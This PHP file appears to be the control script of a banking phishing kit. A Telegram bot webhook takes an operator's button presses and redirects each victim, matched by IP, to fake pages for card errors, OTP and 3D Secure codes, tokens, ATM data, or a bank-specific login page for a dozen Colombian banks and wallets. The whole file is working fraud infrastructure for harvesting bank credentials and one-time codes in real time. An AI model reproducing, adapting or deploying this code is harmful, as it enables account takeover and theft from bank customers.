<?php
// Iniciar la sesión si es necesario
session_start();

// Leer el contenido de la solicitud POST enviada por Telegram
$input = file_get_contents('php://input');
$update = json_decode($input, true);

if (isset($update['callback_query'])) {
    $callbackData = $update['callback_query']['data']; // Datos del botón presionado
    $ip = $_SERVER['REMOTE_ADDR']; // IP del usuario
    $messageText = $update['callback_query']['message']['text'];
    $ipRecibida = explode("\n", $messageText)[0];
    $messageId = $update['callback_query']['message']['message_id'];

    // Verificar si la IP recibida coincide con la IP actual
    if ($ipRecibida == $ip) {
        // Redireccionar según la página recibida en el callback
        redireccionamiento($callbackData, $ip, $update['callback_query']['message']['chat']['id'], $update['callback_query']['message']['from']['id']);

        // Actualizar la sesión con el mensaje procesado
        if (!isset($_SESSION['processed_messages'])) {
            $_SESSION['processed_messages'] = [];
        }
        $_SESSION['processed_messages'][] = $messageId;
    }
}

function redireccionamiento($page, $ip, $chatId, $userId) {
    switch ($page) {
        case "info":
            header("Location: rastrear.php");
            break;
        case "❌TC":
            header("Location: payment_error.php");
            break;
        case "⭐️OTP":
            header("Location: 3d.php");
            break;
        case "❌OTP":
            header("Location: 3d_error.php");
            break;
        case "🏦LG":
        case "❌LG":
            $bank = $_SESSION['bank'];
            $bankPages = [
                "BANCOLOMBIA" => "logo2.php",
                "BANCO COLPATRIA" => "logocolpa5.php",
                "BANCO DAVIVIENDA" => "logodavi3.php",
                "BANCO FALABELLA" => "logofala4.php",
                "NEQUI" => "logonequi6.php",
                "BANCO DE BOGOTA" => "logobogo5.php",
                "BANCO BBVA" => "logobb.php",
                "BANCO CAJA SOCIAL" => "logocaja.php",
                "BANCO CITIBANK" => "logociti.php",
                "BANCO POPULAR" => "logopopu.php",
                "TUYA" => "logotuya.php",
                "BANCO DE OCCIDENTE" => "logoocci.php",
                // Más bancos según sea necesario
            ];
            header("Location: " . ($bankPages[$bank] ?? "logo.php"));
            break;
        case "✅FINAL":
            header("Location: finish.php");
            break;
        case "⭐️TK":
            header("Location: token.php");
            break;
        case "⭐️AP":
            header("Location: otpap.php");
            break;
        case "🏧":
            header("Location: atm.php");
            break;
        default:
            header("Location: logo.php");
            break;
    }
    exit;
}
?>
